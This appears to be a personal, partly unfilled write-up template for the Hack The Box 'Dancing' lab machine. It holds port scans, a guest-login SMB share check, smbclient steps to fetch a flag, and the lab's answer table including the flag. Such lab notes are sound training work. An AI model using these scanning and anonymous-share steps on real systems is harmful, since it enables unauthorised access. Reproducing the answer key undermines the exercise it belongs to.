---
title: Dancing
date: 2026-06-27 17:48
description:
platform: HTB
categories:
  - Machines
status:
  - Retired
os:
  - Windows
difficulty:
  - Very Easy
image: ./attachments/Dancing.png
tags:
finished: false
completed: false
---
# Synopsis

<img src="./attachments/Dancing.png" width="100" height="100">


| Machine    |     |
| ---------- | --- |
| OS         |     |
| Difficulty |     |
| Released   |     |
| Created by |     |
| CVE        |     |

>[!summary]
>- Step 1
>- Step 2
## Improved skills
## Used tools

- nmap/rustscan
- nxc 
- smbclient

---
# Commands & Payloads

## Reconnaissance

```sh
rustscan -a $TARGET -r 1-65535 -t 10000 --ulimit 6500 -- -Pn -oN recon/rustscan.txt
sudo nmap -sCV -Pn -vvv -p 135,139,445,5985,47001,49664,49665 -oN recon/nmap_deep
```

## Enumeration

### SMB 

```sh
nxc smb $TARGET -u 'guest' -p '' --shares #  WorkShares      READ,WRITE
smbclient  --no-pass //$TARGET/WorkShares
```
## Exploitation

```
cd James.P
get flag.txt
exit
```

## Lateral Movement

### Local enumeration

### Lateral movement vector

---
## Privilege Escalation

### Local enumeration
### Privilege Escalation vector
---
# Resources

- 
- 

## External Writeup 

`<iframe width="660" height="415" src="https://www.youtube.com/embed/XXXXXX" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`

- Ippsec 
- 0xdf
---
# Trophies

- [ ] **user.txt**
- [ ] **root.txt**


| Task | Question                                                                                                                 | Answer                            |
| ---- | ------------------------------------------------------------------------------------------------------------------------ | --------------------------------- |
| 1    | What does the 3-letter acronym SMB stand for?                                                                            | Server Message Block              |
| 2    | What port does SMB use to operate at?                                                                                    | 445                               |
| 3    | What is the service name for port 445 that came up in our Nmap scan?                                                     | microsoft-ds                      |
| 4    | What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available SMB shares on Dancing? | -L                                |
| 5    | How many shares are there on Dancing?                                                                                    | 4                                 |
| 6    | What is the name of the share we are able to access in the end with a blank password?                                    | WorkShares                        |
| 7    | What is the command we can use within the SMB shell to download the files we find?                                       | get                               |
| 8    | Submit the flag located on the SMB share.                                                                                | 5f61c10dffbc77a704d76016a22f1664[ |

---
# Proof 

![](<./attachments/Dancing-1.png>)

---
# Conclusion

---

# Table of Content 

---
